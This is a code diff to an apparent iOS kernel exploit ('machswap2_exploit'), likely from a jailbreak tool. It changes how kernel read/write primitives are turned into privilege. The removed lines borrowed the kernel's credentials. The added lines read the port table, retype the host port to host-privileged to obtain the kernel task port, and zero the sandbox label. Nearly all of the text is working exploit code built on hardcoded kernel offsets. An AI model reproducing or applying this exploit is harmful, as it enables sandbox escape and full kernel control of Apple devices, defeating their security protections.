@@ -625,6 +625,8 @@ extern uint64_t kernel_base;
 extern uint64_t kernel_slide;
 extern uint64_t ReadKernel64(uint64_t kaddr);
 extern void WriteKernel64(uint64_t kaddr, uint64_t val);
+extern uint32_t ReadKernel32(uint64_t kaddr);
+extern void WriteKernel32(uint64_t kaddr, uint32_t val);
 extern uint64_t cached_proc_struct_addr;
 
 // ********** ********** ********** ye olde pwnage ********** ********** **********
@@ -648,13 +650,11 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets)
     int total_pipes = 0;
     
     host_t host = HOST_NULL;
-    host_t original_host = HOST_NULL;
     thread_t thread = THREAD_NULL;
     
     /********** ********** data hunting ********** **********/
 
     host = mach_host_self();
-    original_host = host;
     thread = mach_thread_self();
     vm_size_t pgsz = 0;
     ret = _host_page_size(host, &pgsz);
@@ -1241,6 +1241,14 @@ value = value | ((uint64_t)read64_tmp << 32);\
     uint64_t itk_space = 0x0;
     rk64(port_addr + offsetof(kport_t, ip_receiver), itk_space);
     LOG("itk_space: 0x%llx", itk_space);
+    
+    uint64_t is_table = 0x0;
+    rk64(itk_space + 0x20, is_table);
+    LOG("is_table: 0x%llx", is_table);
+    
+    uint64_t host_port_addr = 0x0;
+    rk64(is_table + (MACH_PORT_INDEX(host) * 0x18), host_port_addr);
+    LOG("host_port_addr: 0x%llx", host_port_addr);
 
     uint64_t ourtask = 0x0;
     rk64(itk_space + 0x28, ourtask); /* ipc_space->is_task */
@@ -1516,45 +1524,18 @@ value = value | ((uint64_t)read64_tmp << 32);\
         allows the kernel task port to be accessed by any root process 
     */
     WriteKernel64(realhost + 0x10 + (sizeof(uint64_t) * 4), kernel_port_buf);
-
-    /* eleveate creds to kernel */
     
-    uint64_t orig_ucred = ReadKernel64(ourproc + offsets->struct_offsets.proc_ucred);
-    LOG("original ucred: 0x%llx", orig_ucred);
-
-    int orig_uid = getuid();
-
-    uint64_t kern_ucred = ReadKernel64(kernproc + offsets->struct_offsets.proc_ucred);
-    WriteKernel64(ourproc + offsets->struct_offsets.proc_ucred, kern_ucred);
+    uint32_t original_type = ReadKernel32(host_port_addr);
+    WriteKernel32(host_port_addr, IO_BITS_ACTIVE | IKOT_HOST_PRIV);
     
-    LOG("setuid: %d, uid: %d", setuid(0), getuid());
-    if (getuid() != 0)
-    {
-        LOG("failed to elevate to root/kernel creds!");
-        ret = KERN_FAILURE;
-        goto out;
-    }
-
-    host = mach_host_self();
     mach_port_t hsp4;
     ret = host_get_special_port(host, HOST_LOCAL_NODE, 4, &hsp4);
-    mach_port_deallocate(mach_task_self(), host);
-    host = original_host;
     
-    /* de-elevate */
-
-    WriteKernel64(ourproc + offsets->struct_offsets.proc_ucred, orig_ucred);
-    
-    LOG("setuid: %d, uid: %d", setuid(orig_uid), getuid());
-    if (getuid() != orig_uid)
-    {
-        LOG("failed to de-elelvate to uid: %d", orig_uid);
-        ret = KERN_FAILURE;
-        goto out;
-    }
+    WriteKernel32(host_port_addr, original_type);
     
     /* unsandbox */
-    uint64_t cr_label = ReadKernel64(orig_ucred + 0x78);
+    uint64_t ucred = ReadKernel64(ourproc + offsets->struct_offsets.proc_ucred);
+    uint64_t cr_label = ReadKernel64(ucred + 0x78);
     WriteKernel64(cr_label + 0x10, 0);
 
     if (ret != KERN_SUCCESS ||
@@ -1615,7 +1596,6 @@ out:;
     if (MACH_PORT_VALID(host)) {
         mach_port_deallocate(mach_task_self(), host);
         host = HOST_NULL;
-        original_host = HOST_NULL;
     }
     
     if (MACH_PORT_VALID(thread)) {
